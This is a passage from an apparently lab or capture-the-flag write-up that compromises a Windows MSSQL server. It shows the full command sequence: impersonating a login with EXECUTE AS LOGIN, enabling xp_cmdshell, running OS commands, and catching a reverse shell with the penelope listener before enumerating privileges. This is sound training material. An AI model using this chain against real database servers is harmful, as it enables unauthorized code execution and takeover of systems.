    cmd = input("RAW SQL> ")
    if cmd.lower() == 'exit': break
    run_raw(cmd)
```


This new python script is used to run the statement querries


```bash:command
python3 sql_exec.py
RAW SQL> EXECUTE AS LOGIN = 'svc_reports'; SELECT IS_SRVROLEMEMBER('sysadmin')
{
  "reply": "The query executed successfully. The result indicates that the user's request was fulfilled with the value `1`.\n\n| column1 |\n| --- |\n| 1 |",
  "sql": "EXECUTE AS LOGIN = 'svc_reports'; SELECT IS_SRVROLEMEMBER('sysadmin') -- -",
  "result": {
    "columns": [
      ""
    ],
    "rows": [
      [
        "1"
      ]
    ]
  }
}
RAW SQL>
```


I find that the user is a admin


```bash:command
RAW SQL> EXECUTE AS LOGIN = 'svc_reports'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
{
  "reply": "The query executed successfully with the specified parameters.\n\n_(query ran; no rows returned)_",
  "sql": "EXECUTE AS LOGIN = 'svc_reports'; EXEC sp_configure 'show advanced options', 1; RECONFIGURE; EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE; -- -",
  "result": {
    "columns": [],
    "rows": []
  }
}
RAW SQL> EXECUTE AS LOGIN = 'svc_reports'; EXEC xp_cmdshell 'whoami'
{
  "reply": "The query executed successfully, and the output is \"unclaimed\\\\svc_sql\".\n\n| output |\n| --- |\n| unclaimed\\svc_sql |\n|  |",
  "sql": "EXECUTE AS LOGIN = 'svc_reports'; EXEC xp_cmdshell 'whoami' -- -",
  "result": {
    "columns": [
      "output"
    ],
    "rows": [
      [
        "unclaimed\\svc_sql"
      ],
      [
        null
      ]
    ]
  }
}
RAW SQL> 
```


And with that I get Command injection


```bash:command
penelope -M

(Penelope)> listeners add -i tun0 -p 9001
[+] Listening for reverse shells on 10.10.15.195:9001
[+] [New Reverse Shell] => UNCLAIMED 10.129.206.189 Microsoft_Windows_11_Pro-x64-based_PC 👤 unclaimed\svc_sql 😍️ Session ID <1>
(Penelope)> use 1
(Penelope)─(Session [1])> interact
[+] Added readline support...
[+] Interacting with session [1] • Readline • Menu key Ctrl-D ⇐
[+] Session log: /home/d4rkc0de/.penelope/sessions/UNCLAIMED~10.129.206.189-Microsoft_Windows_11_Pro-x64-based_PC/2026_11_14-17_08_15-224-unclaimed\svc_sql.log
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
PS C:\Windows\System32>
<...SNIP...>
PS C:\users\svc_sql\Desktop> ls


    Directory: C:\users\svc_sql\Desktop


Mode                 LastWriteTime         Length Name                                                                 
----                 -------------         ------ ----                                                                 
-ar---        11/13/2026  11:36 PM             34 user.txt                                                             


PS C:\users\svc_sql\Desktop>
```


And I get a reverse shell with that and the first user flag


## Privilege Escalation



```bash:command
PS C:\users\svc_sql\Desktop> whoami /all

USER INFORMATION
----------------

User Name         SID
================= ==============================================
unclaimed\svc_sql S-1-5-21-2554513647-1216688035-3073314765-1003


GROUP INFORMATION
-----------------

Group Name                             Type             SID                                                             Attributes
====================================== ================ =============================================================== ==================================================
Everyone                               Well-known group S-1-1-0                                                         Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                          Alias            S-1-5-32-545                                                    Mandatory group, Enabled by default, Enabled group
BUILTIN\Performance Monitor Users      Alias            S-1-5-32-558                                                    Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\SERVICE                   Well-known group S-1-5-6                                                         Mandatory group, Enabled by default, Enabled group
CONSOLE LOGON                          Well-known group S-1-2-1                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users       Well-known group S-1-5-11                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization         Well-known group S-1-5-15                                                        Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Local account             Well-known group S-1-5-113                                                       Mandatory group, Enabled by default, Enabled group
NT SERVICE\MSSQLSERVER                 Well-known group S-1-5-80-3880718306-3832830129-1677859214-2598158968-1052248003 Enabled by default, Enabled group, Group owner
LOCAL                                  Well-known group S-1-2-0                                                         Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication       Well-known group S-1-5-64-10                                                     Mandatory group, Enabled by default, Enabled group
Mandatory Label\Medium Mandatory Level Label            S-1-16-8192


PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                    State
============================= ============================== ========
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled
SeCreateGlobalPrivilege       Create global objects          Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set Disabled

PS C:\users\svc_sql\Desktop>
```


I have the following permissions